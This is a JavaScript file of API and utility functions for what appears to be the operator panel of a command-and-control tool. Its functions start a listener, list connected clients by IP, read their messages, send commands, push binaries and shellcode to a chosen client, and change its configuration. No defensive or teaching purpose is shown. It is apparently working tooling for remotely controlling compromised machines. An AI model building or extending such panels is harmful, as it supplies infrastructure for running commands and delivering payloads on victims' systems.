// API service functions
const API_BASE = 'http://localhost:8080';

const apiService = {
    async startListener() {
        const result = await fetch(`${API_BASE}/start-listener`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({})
        });
        return await result.json();
    },

    async getClients() {
        const result = await fetch(`${API_BASE}/get-clients`);
        return await result.json();
    },

    async getClientInfo(clientIP) {
        const result = await fetch(`${API_BASE}/get-client-info?client=${clientIP}`);
        return await result.json();
    },

    async getClientMessages(clientIP) {
        const result = await fetch(`${API_BASE}/get-client-messages?client=${clientIP}`);
        return await result.json();
    },

    async sendCommand(client, command) {
        const result = await fetch(`${API_BASE}/send-command`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ client, command })
        });
        return await result.json();
    },

    async sendFile(client, file) {
        const formData = new FormData();
        formData.append('client', client);
        formData.append('binaryFile', file);
        
        const result = await fetch(`${API_BASE}/send-binary`, {
            method: 'POST',
            body: formData
        });
        return await result.json();
    },

    async sendShellcode(client, file) {
        const formData = new FormData();
        formData.append('client', client);
        formData.append('shellcodeFile', file);
        
        const result = await fetch(`${API_BASE}/send-shellcode`, {
            method: 'POST',
            body: formData
        });
        return await result.json();
    },

    async updateConfig(client, config) {
        const result = await fetch(`${API_BASE}/update-config`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ client, config })
        });
        return await result.json();
    }
};

// Utility functions
const utils = {
    formatLastSeen(lastSeen) {
        if (!lastSeen) return 'Unknown';
        const date = new Date(lastSeen);
        return date.toLocaleString();
    },

    formatMessageTime(timestamp) {
        const date = new Date(timestamp);
        return date.toLocaleTimeString();
    },

    getStatusClass(status) {
        if (!status) return '';
        if (status.includes('✅') || status.includes('Listener started')) return 'success';
        if (status.includes('❌') || status.includes('Error')) return 'error';
        if (status.includes('⚠️') || status.includes('DANGER')) return 'warning';
        return '';
    }
};